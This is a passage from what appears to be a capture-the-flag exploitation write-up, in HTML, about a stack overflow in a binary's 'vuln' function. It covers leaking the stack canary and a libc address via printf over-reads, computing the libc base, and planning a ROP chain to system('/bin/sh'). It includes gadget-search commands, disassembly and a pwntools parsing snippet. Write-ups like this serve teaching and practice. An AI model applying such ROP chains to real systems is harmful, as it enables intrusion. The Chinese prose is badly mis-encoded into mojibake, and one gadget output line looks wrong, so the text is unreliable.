<code>Gadget</code>ï¼ä½†ä»¤äººé—æ†¾çš„æ˜¯ï¼Œæˆ‘æ‰¾éäº†æ•´ä¸ª executable è¿æ¯”è¾ƒåˆé€‚çš„éƒ½æ²¡æœ‰ï¼Œæ›´ä¸ç”¨è¯´å®Œç¾çš„ <code>pop rdi ; ret</code>äº†ã€‚ä¸‹é¢æ‰¾çš„æ˜¯ä¸¤ä¸ªæœ€å¯èƒ½åˆé€‚çš„ï¼Œä½†æ˜¯ <code>rip</code>çš„å€¼ä¸åœ¨æˆ‘ä»¬çš„æ§åˆ¶èŒƒå›´å†…ï¼Œå› æ­¤è¿™ä¸ªæƒ³æ³•å€’åœ¨äº†æœ€åä¸€æ­¥ä¸Šã€‚OUT</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000000012</span>c3 &lt;vuln&gt;:</span><br><span class="line">    <span class="number">1318</span>:<span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">42</span> <span class="number">0</span>d <span class="number">00</span> <span class="number">00</span> lea    <span class="number">0xd42</span>(%rip),%rax        # <span class="number">2061</span> &lt;_IO_stdin_used+<span class="number">0x61</span>&gt;</span><br><span class="line">    <span class="number">131f</span>:<span class="number">48</span> <span class="number">89</span> c7             mov    %rax,%rdi</span><br><span class="line">    <span class="number">1322</span>:e8 f9 fd ff ff       call   <span class="number">1120</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">    <span class="number">1327</span>:<span class="number">48</span> <span class="number">8b</span> <span class="number">15</span> <span class="number">42</span> <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span> mov    <span class="number">0x2d42</span>(%rip),%rdx</span><br><span class="line">    <span class="number">1355</span>:<span class="number">48</span> <span class="number">83</span> f8 <span class="number">10</span>          cmp    $<span class="number">0x10</span>,%rax</span><br><span class="line">    <span class="number">1359</span>:<span class="number">76</span> <span class="number">25</span>                jbe    <span class="number">1380</span> &lt;vuln+<span class="number">0xbd</span>&gt;</span><br><span class="line">    <span class="number">135b</span>:<span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">1</span>e <span class="number">0</span>d <span class="number">00</span> <span class="number">00</span> lea    <span class="number">0xd1e</span>(%rip),%rax        # <span class="number">2080</span> &lt;_IO_stdin_used+<span class="number">0x80</span>&gt;</span><br><span class="line">    <span class="number">1362</span>:<span class="number">48</span> <span class="number">89</span> c7             mov    %rax,%rdi</span><br><span class="line">    <span class="number">1365</span>:e8 b6 fd ff ff       call   <span class="number">1120</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="è¯»å–æ ˆå­˜ç•™çš„-libc-å‡½æ•°è°ƒç”¨ä¿¡æ¯"><a class="markdownIt-Anchor" href="#è¯»å–æ ˆå­˜ç•™çš„-libc-å‡½æ•°è°ƒç”¨ä¿¡æ¯"></a> è¯»å–æ ˆå­˜ç•™çš„ libc å‡½æ•°è°ƒç”¨ä¿¡æ¯</h3><p>æ—¢ç„¶æ— æ³•é€šè¿‡ puts æ¥è·å¾—åŸºå€ï¼Œç¬¬äºŒæ¬¡å°è¯•è¯»å–åœ¨<strong>mainæ ˆå¸§</strong>ä¸­å­˜ç•™çš„å…³äº libc çš„åœ°å€ä¿¡æ¯ã€‚è·å¾—libcçš„ä¿¡æ¯åå°è¯•å¾—åˆ° libc çš„åŸºå€ï¼Œæœ‰äº†åŸºå€åæˆ‘ä»¬å°±å¯ä»¥å¾ˆè½»æ¾åœ°æ‰¾åˆ°libcä¸­ <code>pop rdi; ret;</code> çš„ gadgetï¼ŒæŠŠ<code>&quot;/bin/sh&quot;</code>çš„è¿è¡Œæ—¶åœ°å€ pop åˆ° rdiï¼Œç„¶åè·³è½¬åˆ° systemã€‚</p><p>ä¸€å¼€å§‹çš„æ€è·¯å¤šäº†ä¸€ä¸ªè®¡ç®—ç¨‹åºè¿è¡ŒåŸºå€çš„é˜¶æ®µï¼Œå…¶å®æ²¡æœ‰å¿…è¦ï¼š</p><ol><li><strong>Stage 1</strong>ï¼šæ³„éœ²æ ˆé‡‘ä¸é›€</li><li><s><strong>Stage 2</strong>ï¼šæ³„éœ² <code>main</code> å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè®¡ç®— Executable åŸºåœ°å€ã€‚</s></li><li><strong>Stage 3</strong>ï¼šæ³„éœ² Libc çš„è¿è¡Œæ—¶åœ°å€ï¼Œè®¡ç®— Libc åŸºåœ°å€ã€‚</li><li><strong>Stage 4</strong>ï¼šæ„é€ æœ€ç»ˆ ROP é“¾ï¼Œä½¿ç”¨ Libc gadget è°ƒç”¨ <code>system(&quot;/bin/sh&quot;)</code>ã€‚**</li></ol><p><strong>è¿™ä¸ªæ€è·¯çš„é‡ç‚¹åœ¨äºè¯»å–æ ˆä¸Šæ®‹ç•™çš„ libc ä¿¡æ¯ï¼Œå¹¶åˆ†æè¿™ä¸ªä¿¡æ¯æ¥è®¡ç®—å…¶åœ¨ libc ä¸­çš„åç§»é‡ï¼Œä»è€Œå¾—åˆ° libc è¿è¡ŒåŸºå€ã€‚</strong></p><p>å…ˆå‡†å¤‡ä¸€ä¸‹ ROP è°ƒç”¨é“¾éœ€è¦çš„ä¸œè¥¿ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥æ‰¾ä¸€ä¸ª Gatget å…¥å£åœ°å€</span></span><br><span class="line">$ ROPgadget --binary libc.so.6 --only <span class="string">&quot;pop|ret&quot;</span> | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x000000000002a3e5 : pop ret ; ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># system å‡½æ•°å…¥å£åœ°å€</span></span><br><span class="line">$ nm -D libc.so.6 | grep system</span><br><span class="line">0000000000050d70 T __libc_system@@GLIBC_PRIVATE</span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/sh å­—ç¬¦ä¸²å­—é¢é‡åœ°å€</span></span><br><span class="line">$ strings -a -t x libc.so.6 | grep <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"> 1d8678 /bin/sh</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯è¦è·³è¿‡ <code>endbr64</code>ï¼Œæ‰€ä»¥å®é™…çš„ system å…¥å£åœ°å€åç§»é‡ä¸º <code>0x50d74</code> ã€‚</p><p>ç°åœ¨è¯¦ç»†æ‹†è§£ Stage 3 çš„è¿‡ç¨‹ï¼š</p><p>ç”±äºæˆ‘ä»¬å‘ç° Executable ä¸­ä¼¼ä¹ç¼ºå°‘æ–¹ä¾¿çš„ <code>pop rdi; ret;</code> æˆ–ç±»ä¼¼ gadget æ¥æ„å»ºæ ‡å‡†çš„ <code>puts(read@got)</code> æ³„éœ²é“¾ï¼Œæˆ‘ä»¬å°†åˆ©ç”¨ <code>vuln</code> å‡½æ•°ä¸­ <code>read(0, buf, 0x408)</code> å’Œ <code>printf(&quot;01 %16s ... %ds\n\n&quot;, buf, last)</code> çš„å·¨å¤§æº¢å‡ºå’Œæ‰“å°ç‰¹æ€§æ¥æ³„éœ² Libc åœ°å€ã€‚</p><p>å› æ­¤æˆ‘ä»¬å°†åœ¨ç¬¬ä¸‰æ¬¡è¾“å…¥æ—¶ä¸æ–­å°è¯•å‘é€ç²¾å¿ƒæ„é€ çš„ payloadã€‚è¿™ä¸ª payload çš„é•¿åº¦éœ€ <strong>é•¿åº¦è¶³å¤Ÿå¤§ï¼Œä»¥æº¢å‡ºåˆ° <code>main</code> å‡½æ•°çš„æ ˆå¸§ç”šè‡³æ›´é«˜åœ°å€ï¼š</strong> è¿™éƒ¨åˆ†æº¢å‡ºçš„æ•°æ®æœ¬èº«ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯å®ƒä¼šå¯¼è‡´ <code>printf</code> åœ¨æ‰“å°å®Œå›ºå®šæ ¼å¼çš„å†…å®¹åï¼Œç»§ç»­ä»æº¢å‡ºæ‰€åˆ°è¾¾çš„æ ˆå†…å­˜åŒºåŸŸè¯»å–å¹¶æ‰“å°æ•°æ®ã€‚</p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ<strong>æ ˆä¸Šå¯èƒ½å­˜æœ‰å“ªäº› Libc ä¿¡æ¯ï¼Ÿ</strong></p><p>å½“ <code>main</code> å‡½æ•°è°ƒç”¨ <code>vuln</code> æ—¶ï¼Œ<code>main</code> å‡½æ•°çš„æ ˆå¸§ä½äº <code>vuln</code> å‡½æ•°çš„æ ˆå¸§ä¹‹ä¸Šã€‚<code>main</code> å‡½æ•°åœ¨è°ƒç”¨ <code>vuln</code> ä¹‹å‰å’Œä¹‹åï¼Œè¿˜ä¼šè°ƒç”¨è®¸å¤šå…¶ä»–çš„ Libc å‡½æ•°ï¼Œä¾‹å¦‚ <code>setvbuf</code>ã€<code>printf</code>ã€<code>time</code>ã€<code>scanf</code>ã€<code>toupper</code>ã€<code>exit</code> ç­‰ã€‚åœ¨è¿™äº›å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œ<code>main</code> å‡½æ•°çš„æ ˆå¸§ä¸Šå¯èƒ½ä¼šå­˜æ”¾ä»¥ä¸‹ä¸ Libc ç›¸å…³çš„ä¿¡æ¯ï¼š</p><ul><li><strong>ä» Libc å‡½æ•°è¿”å›çš„åœ°å€</strong>ï¼šè¿™ä¸ªåœ°å€å¯èƒ½å°±æ˜¯ libc å‡½æ•°ä¸­ä¸€ä¸ªæŒ‡ä»¤çš„å®é™…åœ°å€</li><li><strong>æŒ‡å‘ Libc æ•°æ®ç»“æ„çš„æŒ‡é’ˆï¼š</strong> ä¾‹å¦‚ï¼Œ<code>setvbuf</code> å‡½æ•°ä¼šæ“ä½œ <code>stdin</code>ã€<code>stdout</code>ã€<code>stderr</code> è¿™äº› <code>FILE</code> ç»“æ„ä½“ã€‚<code>main</code> å‡½æ•°çš„å±€éƒ¨å˜é‡æˆ–ä¼ é€’ç»™å…¶ä»–å‡½æ•°çš„å‚æ•°ä¸­ï¼Œå¯èƒ½ä¿å­˜ç€æŒ‡å‘è¿™äº›ä½äº Libc æ•°æ®æ®µçš„ <code>FILE</code> ç»“æ„ä½“çš„æŒ‡é’ˆã€‚</li><li><strong>Libc å‡½æ•°åœ¨ GOT è¡¨ä¸­çš„è¿è¡Œæ—¶åœ°å€çš„æ‹·è´ (å¯èƒ½æ€§è¾ƒä½ï¼Œé™¤éæœ‰ç‰¹å®šä»£ç è¿™æ ·åš)ã€‚</strong></li></ul><p>ä¸ºäº†ä» Stage 3 çš„è¾“å‡ºæ¥è§£æå‡ºè¿™äº›åœ°å€ã€‚å…³é”®åœ¨äº<strong>è¯†åˆ«åœ°å€æ¨¡å¼ï¼š</strong> åœ¨ 64 ä½ Linux ç³»ç»Ÿä¸­ï¼ŒLibc çš„åœ°å€é€šå¸¸ä»¥ <code>0x7f</code> å¼€å¤´ï¼ˆæˆ–è€…ä»¥ <code>0x7f</code> ä½œä¸ºå…¶ 8 å­—èŠ‚è¡¨ç¤ºçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼‰ã€‚åœ¨è§£æè¾“å‡ºæ—¶ï¼Œå¯»æ‰¾ä»¥ <code>\x7f</code> ç»“å°¾çš„ 8 å­—èŠ‚åºåˆ—ï¼Œè¿™äº›å¾ˆå¯èƒ½æ˜¯ Libc çš„åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸æ–­å®éªŒè¾“å…¥ <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>â‰¡</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>8</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">size â‰¡ 0(mod 8)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord">8</span><span class="mclose">)</span></span></span></span> çš„payloadï¼Œçœ‹çœ‹æº¢å‡ºç»“æœä¼šä¸ä¼šç¬¦åˆåœ°å€è¦æ±‚ã€‚</p><p>æˆ‘ä»¬ä¸çŸ¥é“åœ¨æ ˆä¸Šå“ªä¸ªä½ç½®ä¼šæœ‰ libc å‡½æ•°ä¿¡æ¯ï¼Œä¹Ÿä¸çŸ¥é“è¿™ä¸ªä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥éœ€è¦ä¸æ–­å°è¯•ï¼‹çŒœæµ‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.py æœ¬åœ°æµ‹è¯•executable</span></span><br><span class="line">libc_line = r.recvline() <span class="comment"># æ¥æ”¶æ‰“å° padding åçš„å€¼</span></span><br><span class="line">log.info(<span class="string">f&quot;æ¥æ”¶åˆ°çš„ libc è¡Œ: <span class="subst">&#123;libc_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">end_index = libc_line.index(<span class="number">0x20</span>) Â <span class="comment"># æ‰¾åˆ°ç¬¬ä¸€ä¸ª 0x20 çš„ä½ç½®</span></span><br><span class="line"><span class="keyword">if</span> end_index == <span class="number">0</span>:</span><br><span class="line">log.error(<span class="string">&quot;libc è¡Œä¸ºç©ºï¼æ²¡èƒ½è¯»åˆ°ç›¸å…³ä¿¡æ¯&quot;</span>)</span><br><span class="line">libc_partial_bytes = libc_line[:end_index]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¡«å……åˆ°8å­—èŠ‚ï¼Œä¸è¶³éƒ¨åˆ†ç”¨0x00è¡¥é½</span></span><br><span class="line">libc_bias = libc_partial_bytes.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;æˆåŠŸæå–åˆ°éƒ¨åˆ†çš„ libc æŒ‡ä»¤åœ°å€ä¸º: <span class="subst">&#123;libc_partial_bytes&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;é‡æ„å®Œæ•´çš„ libc æŒ‡ä»¤åœ°å€: <span class="subst">&#123;<span class="built_in">int</span>.from_bytes(libc_bias, byteorder=<span class="string">&#x27;little&#x27;</span>):#x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(libc_bias) != <span class="number">8</span>:</span><br><span class="line"> log.warning(<span class="string">f&quot;é‡æ„åçš„ libc åœ°å€é•¿åº¦ä¸æ˜¯ 8 (<span class="subst">&#123;<span class="built_in">len</span>(libc_bias)&#125;</span>)ï¼&quot;</span>)</span><br><span class="line"> log.info(<span class="string">f&quot;è¿”å›åœ°å€è¡Œæ‰€æœ‰å­—èŠ‚ (hex): <span class="subst">&#123;libc_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/proc/<span class="subst">&#123;pid&#125;</span>/maps&#x27;</span>) <span class="keyword">as</span> maps_file:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> maps_file:</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;libc&#x27;</span> <span class="keyword">in</span> line <span class="keyword">and</span> <span class="string">&#x27;r--p&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">addr = <span class="built_in">int</span>(line.split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&quot;é€šè¿‡ç³»ç»ŸæŸ¥çœ‹ libc åŸºåœ°å€ä¸º: <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc_base_addr =addr</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸æ–­åœ°æµ‹è¯•ï¼Œåœ¨å‘é€ 32 + 7 * 8= 88 å­—èŠ‚ payload æ—¶ï¼Œå¾—åˆ°äº†ä¸€ä¸ª <code>0x7f</code> å¼€å¤´çš„åœ°å€ï¼Œå¯¹æ¯”æµ‹è¯•æ—¶å…·ä½“çš„ libc åœ°å€ï¼Œå¾—åˆ°è¿™ä¸ª libc æŒ‡ä»¤çš„åç§»é‡ä¸º <code>0x29d90</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">29d90: Â  Â 89 c7 Â  Â  Â mov Â  Â %eax,%edi</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¯¹è¿™ä¸ªåç§»é‡è¿›è¡Œå°è¯•ï¼Œåœ¨å®é™…çš„è„šæœ¬ä¸­å‘é€åŒæ ·å¤§å°çš„ payloadï¼Œå¾—åˆ°å®é™… libc æŒ‡ä»¤åœ°å€å†å‡å»åç§»é‡å°±èƒ½å¾—åˆ° libc åŠ è½½çš„åŸºå€äº†ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy="false">(</mo><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>u</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo stretchy="false">)</mo><mo>âˆ’</mo><mi>L</mi><mi>I</mi><mi>B</mi><mi>C</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">libc\_base\_addr = int(instruction\_addr) - LIBC\_OFFSET</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><p>æœ‰äº† Libc åŸºå€åï¼Œæˆ‘ä»¬æ ¹æ®åç§»é‡è®¡ç®—æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿çš„å®é™…è¿è¡Œæ—¶åœ°å€ï¼š</p><ol><li><strong>è®¡ç®— Libc ä¸­ Gadget çš„è¿è¡Œæ—¶åœ°å€ï¼š</strong></li></ol><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>o</mi><mi>p</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>d</mi><mi>i</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mi>t</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>+</mo><mi>P</mi><mi>O</mi><mi>P</mi><mi mathvariant="normal">_</mi><mi>R</mi><mi>D</mi><mi>I</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">pop\_rdi\_retaddr = libc\_base\_addr + POP\_RDI\_OFFSET</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><ol start="2"><li><strong>è®¡ç®— Libc ä¸­ <code>/bin/sh</code> å­—ç¬¦ä¸²çš„è¿è¡Œæ—¶åœ°å€ï¼š</strong></li></ol><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>i</mi><mi>n</mi><mi>s</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>+</mo><mi>B</mi><mi>I</mi><mi>N</mi><mi>S</mi><mi>H</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">binsh\_addr=libc\_base\_addr+BINSH\_OFFSET</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><ol start="3"><li><strong>è®¡ç®— Libc ä¸­ <code>system</code> å‡½æ•°çš„è¿è¡Œæ—¶åœ°å€ï¼š</strong></li></ol><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi 